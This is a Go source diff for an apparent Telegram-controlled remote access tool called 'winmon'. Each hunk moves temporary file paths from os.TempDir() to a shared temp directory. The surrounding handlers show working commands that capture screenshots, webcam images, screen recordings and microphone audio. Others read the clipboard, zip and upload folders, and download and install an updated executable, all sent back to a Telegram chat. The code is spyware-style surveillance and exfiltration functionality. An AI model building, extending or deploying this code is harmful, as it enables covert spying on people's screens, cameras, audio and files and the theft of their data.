@@ -1216,7 +1216,7 @@ func (b *BotCoordinator) executeNative(cmd string, args []string, chatID int64, 
 
 	// Fallback/interactive commands executed in console mode directly
 	case "/screenshot":
-		tempPath := filepath.Join(os.TempDir(), "screenshot.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "screenshot.jpg")
 		err := media.CaptureScreen(tempPath)
 		if err != nil {
 			b.sendMessage(chatID, fmt.Sprintf("Failed to capture screenshot: %v", err), msgID)
@@ -1227,7 +1227,7 @@ func (b *BotCoordinator) executeNative(cmd string, args []string, chatID int64, 
 		b.sendFile(chatID, "sendPhoto", "photo", tempPath, msgID)
 
 	case "/webcam":
-		tempPath := filepath.Join(os.TempDir(), "webcam.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "webcam.jpg")
 		err := media.CaptureWebcam(tempPath)
 		if err != nil {
 			b.sendMessage(chatID, fmt.Sprintf("Failed to capture webcam: %v", err), msgID)
@@ -1239,7 +1239,7 @@ func (b *BotCoordinator) executeNative(cmd string, args []string, chatID int64, 
 
 	case "/screenrecord":
 		dur := parseDuration(strings.Join(args, " "))
-		tempPath := filepath.Join(os.TempDir(), "record.gif")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "record.gif")
 		b.sendMessage(chatID, fmt.Sprintf("📹 Recording screen for %s...", dur), msgID)
 		err := media.RecordScreen(dur, tempPath)
 		if err != nil {
@@ -1251,7 +1251,7 @@ func (b *BotCoordinator) executeNative(cmd string, args []string, chatID int64, 
 
 	case "/listen":
 		dur := parseDuration(strings.Join(args, " "))
-		tempPath := filepath.Join(os.TempDir(), "audio.wav")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "audio.wav")
 		b.sendMessage(chatID, fmt.Sprintf("🎙️ Recording audio for %s...", dur), msgID)
 		err := media.RecordAudio(dur, tempPath)
 		if err != nil {
@@ -1495,7 +1495,7 @@ func (b *BotCoordinator) handleDownload(path string, chatID int64, msgID int64) 
 	if info.IsDir() {
 		// Zip it
 		b.sendMessage(chatID, "🗜️ Target is a folder. Compressing to temporary ZIP...", msgID)
-		zipPath := filepath.Join(os.TempDir(), info.Name()+".zip")
+		zipPath := filepath.Join(service.GetSharedTempDir(), info.Name()+".zip")
 		err := files.ZipDirectory(path, zipPath)
 		if err != nil {
 			b.sendMessage(chatID, fmt.Sprintf("Compression failed: %v", err), msgID)
@@ -1519,7 +1519,7 @@ func (b *BotCoordinator) handleHelperOutput(cmd string, chatID int64, msgID int6
 	// Locate temporary helper outputs based on command type
 	switch cmd {
 	case "/screenshot":
-		tempPath := filepath.Join(os.TempDir(), "helper_screenshot.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendFile(chatID, "sendPhoto", "photo", tempPath, msgID)
 			os.Remove(tempPath)
@@ -1527,7 +1527,7 @@ func (b *BotCoordinator) handleHelperOutput(cmd string, chatID int64, msgID int6
 			b.sendMessage(chatID, "Failed to retrieve screenshot from session helper.", msgID)
 		}
 	case "/webcam":
-		tempPath := filepath.Join(os.TempDir(), "helper_webcam.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendFile(chatID, "sendPhoto", "photo", tempPath, msgID)
 			os.Remove(tempPath)
@@ -1535,7 +1535,7 @@ func (b *BotCoordinator) handleHelperOutput(cmd string, chatID int64, msgID int6
 			b.sendMessage(chatID, "Failed to retrieve webcam capture from session helper.", msgID)
 		}
 	case "/screenrecord":
-		tempPath := filepath.Join(os.TempDir(), "helper_record.gif")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendFile(chatID, "sendDocument", "document", tempPath, msgID)
 			os.Remove(tempPath)
@@ -1543,7 +1543,7 @@ func (b *BotCoordinator) handleHelperOutput(cmd string, chatID int64, msgID int6
 			b.sendMessage(chatID, "Failed to retrieve recording from session helper.", msgID)
 		}
 	case "/listen":
-		tempPath := filepath.Join(os.TempDir(), "helper_audio.wav")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendFile(chatID, "sendDocument", "document", tempPath, msgID)
 			os.Remove(tempPath)
@@ -1551,7 +1551,7 @@ func (b *BotCoordinator) handleHelperOutput(cmd string, chatID int64, msgID int6
 			b.sendMessage(chatID, "Failed to retrieve audio from session helper.", msgID)
 		}
 	case "/clipboard":
-		tempPath := filepath.Join(os.TempDir(), "helper_clipboard.txt")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
 		if data, err := os.ReadFile(tempPath); err == nil {
 			b.sendMessage(chatID, fmt.Sprintf("📋 Clipboard Content:\n```\n%s\n```", string(data)), msgID)
 			os.Remove(tempPath)
@@ -1559,7 +1559,7 @@ func (b *BotCoordinator) handleHelperOutput(cmd string, chatID int64, msgID int6
 			b.sendMessage(chatID, "Failed to read clipboard from session helper.", msgID)
 		}
 	case "/wallpaper":
-		tempPath := filepath.Join(os.TempDir(), "helper_wallpaper.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_wallpaper.jpg")
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendFile(chatID, "sendPhoto", "photo", tempPath, msgID)
 			os.Remove(tempPath)
@@ -1635,18 +1635,18 @@ func (b *BotCoordinator) sendExecutionTime(chatID int64, msgID int64, start time
 func RunSessionHelper(cmd string, args string) error {
 	switch cmd {
 	case "/screenshot":
-		tempPath := filepath.Join(os.TempDir(), "helper_screenshot.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
 		return media.CaptureScreen(tempPath)
 	case "/webcam":
-		tempPath := filepath.Join(os.TempDir(), "helper_webcam.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
 		return media.CaptureWebcam(tempPath)
 	case "/screenrecord":
 		dur := parseDuration(args)
-		tempPath := filepath.Join(os.TempDir(), "helper_record.gif")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
 		return media.RecordScreen(dur, tempPath)
 	case "/listen":
 		dur := parseDuration(args)
-		tempPath := filepath.Join(os.TempDir(), "helper_audio.wav")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
 		return media.RecordAudio(dur, tempPath)
 	case "/tts":
 		return audio.SpeakTTS(args)
@@ -1655,7 +1655,7 @@ func RunSessionHelper(cmd string, args string) error {
 	case "/setwallpaper":
 		return display.SetWallpaperLocal(args)
 	case "/wallpaper":
-		tempPath := filepath.Join(os.TempDir(), "helper_wallpaper.jpg")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_wallpaper.jpg")
 		path, err := display.GetWallpaperPath()
 		if err != nil {
 			return err
@@ -1721,7 +1721,7 @@ func RunSessionHelper(cmd string, args string) error {
 		}
 		return nil
 	case "/clipboard":
-		tempPath := filepath.Join(os.TempDir(), "helper_clipboard.txt")
+		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
 		txt, err := clipboard.GetClipboardLocal()
 		if err != nil {
 			return err
@@ -1821,7 +1821,7 @@ func (b *BotCoordinator) handleServiceUpdate(doc *TelegramDocument, chatID int64
 	}
 	defer resp.Body.Close()
 
-	tempPath := filepath.Join(os.TempDir(), "winmon_new.exe")
+	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_new.exe")
 	out, err := os.Create(tempPath)
 	if err != nil {
 		b.sendMessage(chatID, fmt.Sprintf("Failed to create temporary update file: %v", err), msgID)
@@ -1946,7 +1946,7 @@ func (b *BotCoordinator) handlePlaySound(doc *TelegramDocument, chatID int64, ms
 	}
 	defer resp.Body.Close()
 
-	tempPath := filepath.Join(os.TempDir(), "winmon_sound"+filepath.Ext(doc.FileName))
+	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_sound"+filepath.Ext(doc.FileName))
 	out, err := os.Create(tempPath)
 	if err != nil {
 		b.sendMessage(chatID, fmt.Sprintf("Failed to create temporary audio file: %v", err), msgID)
@@ -2011,7 +2011,7 @@ func (b *BotCoordinator) handleSetWallpaper(doc *TelegramDocument, chatID int64,
 	}
 	defer resp.Body.Close()
 
-	tempPath := filepath.Join(os.TempDir(), "winmon_wallpaper"+filepath.Ext(doc.FileName))
+	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_wallpaper"+filepath.Ext(doc.FileName))
 	out, err := os.Create(tempPath)
 	if err != nil {
 		b.sendMessage(chatID, fmt.Sprintf("Failed to create temporary image file: %v", err), msgID)
